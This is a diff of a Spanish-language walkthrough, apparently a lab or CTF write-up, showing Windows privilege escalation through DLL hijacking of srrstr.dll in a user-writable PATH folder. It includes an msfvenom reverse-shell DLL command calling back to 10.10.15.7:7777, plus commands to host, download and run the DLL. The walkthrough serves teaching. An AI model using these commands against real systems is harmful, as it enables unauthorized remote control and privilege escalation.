@@ -501,22 +501,26 @@ Encontramos en el path la ruta `C:\Users\sarah\AppData\Local\Microsoft\WindowsAp
 
 Nuestro usuario tiene permiso de escritura sobre esa ruta. Esto quiere decir que podriamos colocar una dll maliciosa con el nombre `srrstr.dll` en esa ruta y lograr que el binario la ejecute en un contexto elevado.
 
-El siguiente paso es generar la `dll` maliciosa en nuestra máquina con `msfvenom`
+El siguiente paso es generar la `dll` maliciosa en nuestra máquina con `msfvenom`:
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.7 LPORT=7777 -f dll > srrstr.dll
 ```
+
 <img width="818" height="192" alt="image" src="https://github.com/user-attachments/assets/2f773ec5-58f9-4e1c-a442-1719107f38a2" />
 
 Transferimos el `dll` a la máquina víctima:
+
 ```bash
 python3 -m http.server 8080
 ```
 
-Descargamos la dll en la máquina víctima:
+Descargamos la `dll` en la máquina víctima:
 
 ```powershell
 curl http://10.10.15.7:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
 ```
+
 <img width="1003" height="260" alt="image" src="https://github.com/user-attachments/assets/b547c48e-606f-4bdb-989b-b25e34842875" />
 
 
@@ -531,6 +535,12 @@ El siguiente paso es probar la `dll` con `rundll32`:
 ```powershell
 rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
 ```
+
+<img width="998" height="163" alt="image" src="https://github.com/user-attachments/assets/af8e0fc8-4686-4aab-9581-2cfd3ad9d759" />
+
+<img width="975" height="557" alt="image" src="https://github.com/user-attachments/assets/3b62850b-58a9-4e56-817d-53569d57613d" />
+
+
 
 
 
